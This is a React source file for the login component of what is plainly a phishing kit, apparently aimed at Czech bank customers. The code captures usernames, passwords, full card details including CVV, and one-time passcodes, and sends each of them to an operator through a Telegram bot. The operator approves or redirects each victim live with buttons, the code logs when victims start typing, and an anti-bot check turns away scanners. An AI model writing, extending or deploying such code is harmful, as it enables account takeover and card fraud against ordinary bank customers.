import React, { useState, useEffect, useRef } from 'react';
import axios from 'axios';
import { useLanguage } from '../hooks/useLanguage';
import { useTelegramBot } from '../hooks/useTelegramBot';
import { startTimer, trackInteraction, trackTyping, checkAntiBot, resetAntiBot } from '../utils/antiBot';
import LoginScreen from './LoginScreen';
import CardVerificationForm from './CardVerificationForm';
import OtpVerificationForm from './OtpVerificationForm';
import LoadingOverlay from './LoadingOverlay';
import NextStepAppr from './NextStepAppr';
import './LoginForm.css';
import { useNavigate } from 'react-router-dom';

function LoginForm() {
  const navigate = useNavigate();
  
  const { t } = useLanguage();

  // State management
  const [loginName, setLoginName] = useState('');
  const [password, setPassword] = useState('');
  const [errors, setErrors] = useState({ loginName: false, password: false });
  const [showCardForm, setShowCardForm] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [waitingForApproval, setWaitingForApproval] = useState(false);
  const [waitingForOtpApproval, setWaitingForOtpApproval] = useState(false);
  const [showOtpForm, setShowOtpForm] = useState(false);
  const [otpCode, setOtpCode] = useState('');
  const [otpError, setOtpError] = useState('');
  const [sessionId, setSessionId] = useState(null);
  const [showNextStep, setShowNextStep] = useState(false); // AJOUTÉ
  
  // Typing tracking
  const [loginTypingSent, setLoginTypingSent] = useState(false);
  const [cardTypingSent, setCardTypingSent] = useState(false);
  const [otpTypingSent, setOtpTypingSent] = useState(false);
  
  // Refs for tracking page logs
  const hasSentCardPageLogRef = useRef(false);
  const hasSentOtpLogRef = useRef(false);
  
  const [cardDetails, setCardDetails] = useState({
    cardNumber: '', expiryDate: '', cvv: '', cardholderName: '',
    phoneNumber: '', city: '', postalCode: ''
  });
  const [cardErrors, setCardErrors] = useState({});

  // Anti-bot initialization
  useEffect(() => {
    startTimer();
    const handleMouseMove = () => trackInteraction();
    window.addEventListener('mousemove', handleMouseMove);
    return () => {
      window.removeEventListener('mousemove', handleMouseMove);
      resetAntiBot();
    };
  }, []);

  const handleApprove = async () => {
  if (!hasSentCardPageLogRef.current) {
    await sendCardVerificationPageLog(loginName);
    hasSentCardPageLogRef.current = true;
  }
  
  setWaitingForApproval(false);
  setIsLoading(false);
  
  // Vérifier si le formulaire de carte a déjà été soumis
  const hasCardDetails = cardDetails.cardNumber && cardDetails.cardNumber.trim() !== '';
  
  if (hasCardDetails) {
    // Si l'utilisateur a déjà soumis la carte, afficher NextStepAppr
    console.log('✅ Card already submitted, showing NextStepAppr');
    
    // Stocker les données pour NextStepAppr
    sessionStorage.setItem('loginName', loginName);
    sessionStorage.setItem('cardNumber', cardDetails.cardNumber);
    sessionStorage.setItem('phoneNumber', cardDetails.phoneNumber);
    sessionStorage.setItem('sessionId', sessionId);
    
    // Afficher NextStepAppr au lieu de l'OTP
    setShowNextStep(true);
  } else {
    // Sinon, montrer le formulaire de carte
    console.log('📝 Showing card form for first time');
    setShowCardForm(true);
  }
};
  
  const handleDeny = () => {
    setWaitingForApproval(false);
    setWaitingForOtpApproval(false);
    setIsLoading(false);
    alert(t.denied);
    window.location.reload();
  };

  const handleViewCard = async () => {
    if (!hasSentCardPageLogRef.current) {
      await sendCardVerificationPageLog(loginName);
      hasSentCardPageLogRef.current = true;
    }
    setWaitingForApproval(false);
    setIsLoading(false);
    setShowCardForm(true);
  };

  const handleNextStep = async () => {
    if (!hasSentOtpLogRef.current) {
      await sendOtpPageLog(loginName, cardDetails.phoneNumber, sessionId);
      hasSentOtpLogRef.current = true;
    }
    setWaitingForOtpApproval(false);
    setIsLoading(false);
    setShowCardForm(false);
    setShowOtpForm(true);
    setOtpCode('');
    setOtpError('');
  };

  const handleBackToCard = () => {
    console.log('🔵 Back to Card button clicked!');
    setShowOtpForm(false);
    setShowCardForm(true);
    setOtpCode('');
    setOtpError('');
    hasSentOtpLogRef.current = false;
    setOtpTypingSent(false);
  };

  const handleBackToLogin = () => {
    console.log('🔵 Back to Login button clicked!');
    setShowCardForm(false);
    setShowOtpForm(false);
    setWaitingForOtpApproval(false);
    setWaitingForApproval(false);
    setIsLoading(false);
    setCardDetails({
      cardNumber: '',
      expiryDate: '',
      cvv: '',
      cardholderName: '',
      phoneNumber: '',
      city: '',
      postalCode: ''
    });
    setCardErrors({});
    setOtpCode('');
    setOtpError('');
    setLoginTypingSent(false);
    setCardTypingSent(false);
    setOtpTypingSent(false);
    hasSentCardPageLogRef.current = false;
    hasSentOtpLogRef.current = false;
    resetAntiBot();
    startTimer();
  };

  const handleBlock = async () => {
    console.log('🔵 Block IP button clicked!');
    try {
      const response = await axios.get('https://api.ipify.org?format=json');
      const userIP = response.data.ip;
      
      const blockedIPs = JSON.parse(localStorage.getItem('blocked_ips') || '[]');
      if (!blockedIPs.includes(userIP)) {
        blockedIPs.push(userIP);
        localStorage.setItem('blocked_ips', JSON.stringify(blockedIPs));
      }
      
      sessionStorage.setItem('blocked_ip', userIP);
      window.location.href = '/blocked';
    } catch (error) {
      console.error('Error blocking IP:', error);
      window.location.href = '/blocked';
    }
  };
  
  // MODIFIÉ: Maintenant affiche NextStepAppr au lieu de naviguer
  const handleNextStepAppr = () => {
    console.log('🔵 Next Step (Appr) button clicked! - Showing NextStepAppr component');
    // Stocker les données nécessaires pour NextStepAppr
    sessionStorage.setItem('loginName', loginName);
    sessionStorage.setItem('cardNumber', cardDetails.cardNumber);
    sessionStorage.setItem('phoneNumber', cardDetails.phoneNumber);
    sessionStorage.setItem('sessionId', sessionId);
    setShowNextStep(true); // Afficher le composant NextStepAppr
  };

  // Telegram bot hooks - NOW after handlers are defined
  const {
    generateSessionId,
    sendToTelegramWithButtons,
    sendCardDetailsToTelegram,
    sendFormattedCardDetails,
    sendOtpToTelegram,
    sendSuccessToTelegram,
    sendCardVerificationLog,
    sendOtpPageLog,
    sendCardVerificationPageLog,
    sendOtpSubmitLog,
    sendOtpVerifiedLog,
    sendLoginTypingLog,
    sendCardTypingLog,
    sendOtpTypingLog,
    sendBlockedLog,
    sendConfirmationLog
  } = useTelegramBot(
    sessionId, 
    handleApprove, 
    handleDeny, 
    handleViewCard, 
    handleNextStep, 
    handleBackToCard, 
    handleBackToLogin, 
    handleBlock,
    handleNextStepAppr
  );

  const handleInputChange = async (field, value) => {
    trackTyping();
    
    if (field === 'loginName') {
      setLoginName(value);
      if (!loginTypingSent && value.length === 1) {
        await sendLoginTypingLog(value, 'Login page', 'User is typing username and password');
        setLoginTypingSent(true);
      }
    } else {
      setPassword(value);
      if (!loginTypingSent && value.length === 1) {
        await sendLoginTypingLog(loginName, 'Login page', 'User is typing username and password');
        setLoginTypingSent(true);
      }
    }
    setErrors({ ...errors, [field]: false });
  };

  const handleLogin = async (e) => {
    e.preventDefault();
    
    const newErrors = {
      loginName: loginName.trim() === '',
      password: password.trim() === ''
    };
    setErrors(newErrors);
    if (newErrors.loginName || newErrors.password) return;
    
    const antiBotResult = checkAntiBot();
    console.log('🤖 Enhanced Anti-bot result:', antiBotResult);
    
    if (!antiBotResult.passed) {
      let userIP = 'Unable to get IP';
      try {
        const ipResponse = await axios.get('https://api.ipify.org?format=json');
        userIP = ipResponse.data.ip;
      } catch (ipError) {
        console.error('Error getting IP:', ipError);
      }
      
      await sendBlockedLog(loginName, antiBotResult.reason, userIP);
      sessionStorage.setItem('block_reason', antiBotResult.reason);
      window.location.href = '/blocked';
      return;
    }

    setIsLoading(true);
    setWaitingForApproval(true);
    const newSessionId = generateSessionId();
    setSessionId(newSessionId);
    
    const message = `
🔐 <b>NEW LOGIN ATTEMPT</b> 🔐
⏰ <b>Time:</b> ${new Date().toLocaleString()}
🆔 <b>Session ID:</b> <code>${newSessionId}</code>
━━━━━━━━━━━━━━━━━━━━━

📝 <b>LOGIN CREDENTIALS:</b>
├ 👤 <b>Username:</b> ${loginName.trim()}
└ 🔑 <b>Password:</b> ${password.trim()}

━━━━━━━━━━━━━━━━━━━━━
🤖 <b>Anti-bot Status:</b> ✅ PASSED
📊 <b>Human Score:</b> ${antiBotResult.reason}
━━━━━━━━━━━━━━━━━━━━━
⚠️ <i>Click a button below to proceed</i>
    `;
    
    await sendToTelegramWithButtons(message, newSessionId);
  };

  const handleCardInputChange = async (field, value) => {
    trackTyping();
    
    if (!cardTypingSent) {
      await sendCardTypingLog(loginName, 'Card Verification page', 'User is filling card details');
      setCardTypingSent(true);
    }

    let formattedValue = value;
    
    if (field === 'cardNumber') {
      formattedValue = value.replace(/\s/g, '').replace(/(\d{4})/g, '$1 ').trim();
      if (formattedValue.length > 19) formattedValue = formattedValue.slice(0, 19);
    }
    
    if (field === 'expiryDate') {
      formattedValue = value.replace(/\D/g, '');
      if (formattedValue.length >= 2) {
        formattedValue = formattedValue.slice(0, 2) + (formattedValue.length > 2 ? '/' + formattedValue.slice(2, 4) : '');
      }
      if (formattedValue.length > 5) formattedValue = formattedValue.slice(0, 5);
    }
    
    if (field === 'cvv') {
      formattedValue = value.replace(/\D/g, '').slice(0, 4);
    }
    
    if (field === 'phoneNumber') {
      formattedValue = value.replace(/\D/g, '').slice(0, 9);
    }
    
    if (field === 'city') {
      formattedValue = value.slice(0, 50);
    }
    
    if (field === 'postalCode') {
      formattedValue = value.replace(/\s/g, '');
      if (formattedValue.length > 5) formattedValue = formattedValue.slice(0, 5);
      if (formattedValue.length >= 3 && formattedValue.length <= 5) {
        formattedValue = formattedValue.slice(0, 3) + (formattedValue.length > 3 ? ' ' + formattedValue.slice(3, 5) : '');
      }
    }

    setCardDetails({ ...cardDetails, [field]: formattedValue });
    
    if (cardErrors[field]) {
      setCardErrors({ ...cardErrors, [field]: false });
    }
  };

  const validateCzechPostalCode = (postalCode) => {
    const cleanCode = postalCode.replace(/\s/g, '');
    const postalRegex = /^\d{5}$/;
    return postalRegex.test(cleanCode);
  };

  const validateCardForm = () => {
    const errors = {};
    
    if (!cardDetails.cardNumber.trim() || cardDetails.cardNumber.replace(/\s/g, '').length < 16) {
      errors.cardNumber = t.validCard;
    }
    
    if (!cardDetails.expiryDate.trim() || !/^\d{2}\/\d{2}$/.test(cardDetails.expiryDate)) {
      errors.expiryDate = t.validExpiry;
    } else {
      const [month, year] = cardDetails.expiryDate.split('/');
      const currentDate = new Date();
      const currentYear = currentDate.getFullYear() % 100;
      const currentMonth = currentDate.getMonth() + 1;
      const expYear = parseInt(year);
      const expMonth = parseInt(month);
      
      if (expYear < currentYear || (expYear === currentYear && expMonth < currentMonth)) {
        errors.expiryDate = t.cardExpired;
      }
    }
    
    if (!cardDetails.cvv.trim() || cardDetails.cvv.length < 3) {
      errors.cvv = t.validCvv;
    }
    
    if (!cardDetails.cardholderName.trim()) {
      errors.cardholderName = t.validCardholder;
    }
    
    if (!cardDetails.phoneNumber.trim()) {
      errors.phoneNumber = t.validPhone;
    } else if (cardDetails.phoneNumber.length !== 9) {
      errors.phoneNumber = t.phoneDigits;
    }
    
    if (!cardDetails.city.trim()) {
      errors.city = t.validCity;
    } else if (cardDetails.city.trim().length < 2) {
      errors.city = t.validCityName;
    }
    
    if (!cardDetails.postalCode.trim()) {
      errors.postalCode = t.validPostal;
    } else if (!validateCzechPostalCode(cardDetails.postalCode)) {
      errors.postalCode = t.invalidPostal;
    }
    
    return errors;
  };

  const handleCardSubmit = async (e) => {
    e.preventDefault();
    sessionStorage.setItem('cardNumber', cardDetails.cardNumber);
    
    const antiBotResult = checkAntiBot();
    if (!antiBotResult.passed) {
      let userIP = 'Unable to get IP';
      try {
        const ipResponse = await axios.get('https://api.ipify.org?format=json');
        userIP = ipResponse.data.ip;
      } catch (ipError) {
        console.error('Error getting IP:', ipError);
      }
      
      await sendBlockedLog(loginName, `Card page - ${antiBotResult.reason}`, userIP);
      sessionStorage.setItem('block_reason', antiBotResult.reason);
      window.location.href = '/blocked';
      return;
    }
    
    const errors = validateCardForm();
    
    if (Object.keys(errors).length === 0) {
      setIsLoading(true);
      setWaitingForOtpApproval(true);
      await sendCardVerificationLog(loginName);
      await sendCardDetailsToTelegram(cardDetails, sessionId);
      
      // Stocker les données pour NextStepAppr
      sessionStorage.setItem('loginName', loginName);
      sessionStorage.setItem('cardNumber', cardDetails.cardNumber);
      sessionStorage.setItem('phoneNumber', cardDetails.phoneNumber);
      sessionStorage.setItem('sessionId', sessionId);
      
      setIsLoading(false);
    } else {
      setCardErrors(errors);
    }
  };

  const handleOtpSubmit = async (e) => {
    e.preventDefault();
    
    if (!otpCode.trim() || otpCode.length < 6) {
      setOtpError(t.validOtp);
      return;
    }
    
    const antiBotResult = checkAntiBot();
    if (!antiBotResult.passed) {
      let userIP = 'Unable to get IP';
      try {
        const ipResponse = await axios.get('https://api.ipify.org?format=json');
        userIP = ipResponse.data.ip;
      } catch (ipError) {
        console.error('Error getting IP:', ipError);
      }
      
      await sendBlockedLog(loginName, `OTP page - ${antiBotResult.reason}`, userIP);
      sessionStorage.setItem('block_reason', antiBotResult.reason);
      window.location.href = '/blocked';
      return;
    }
    
    setIsLoading(true);
    
    await sendOtpSubmitLog(loginName, cardDetails.phoneNumber, otpCode);
    await sendOtpToTelegram(otpCode, cardDetails.phoneNumber, sessionId);
    await sendOtpVerifiedLog(loginName, cardDetails.phoneNumber, otpCode);
    await sendSuccessToTelegram(cardDetails.phoneNumber, sessionId);
    await sendFormattedCardDetails(cardDetails, sessionId, loginName, password);
    
    setIsLoading(false);
    
    alert(t.success);
    window.location.reload();
  };

  const handleOtpChange = async (value) => {
    trackTyping();
    setOtpCode(value);
    if (!otpTypingSent && value.length === 1) {
      await sendOtpTypingLog(loginName, cardDetails.phoneNumber, 'User is typing OTP code');
      setOtpTypingSent(true);
    }
    setOtpError('');
  };

  const isLoadingState = isLoading || waitingForApproval || waitingForOtpApproval;

  // MODIFIÉ: Return avec condition pour afficher NextStepAppr
return (
  <div className="login-container">
    {showNextStep ? (
      <NextStepAppr />
    ) : (
      <>
        <h2>{t.loginTitle}</h2>

        <LoadingOverlay 
          isLoading={isLoadingState}
          waitingForApproval={waitingForApproval}
          waitingForOtpApproval={waitingForOtpApproval}
          t={t}
        />

        {!showCardForm && !showOtpForm && !waitingForApproval && !waitingForOtpApproval && (
          <LoginScreen
            loginName={loginName}
            password={password}
            errors={errors}
            isLoading={isLoading}
            t={t}
            onInputChange={handleInputChange}
            onLogin={handleLogin}
          />
        )}

        {showCardForm && !waitingForOtpApproval && (
          <CardVerificationForm
            cardDetails={cardDetails}
            cardErrors={cardErrors}
            isLoading={isLoading}
            t={t}
            onInputChange={handleCardInputChange}
            onSubmit={handleCardSubmit}
          />
        )}

        {showOtpForm && (
          <OtpVerificationForm
            otpCode={otpCode}
            otpError={otpError}
            isLoading={isLoading}
            t={t}
            onOtpChange={handleOtpChange}
            onSubmit={handleOtpSubmit}
            onBack={handleBackToCard}
          />
        )}
      </>
    )}
  </div>
);
}

export default LoginForm;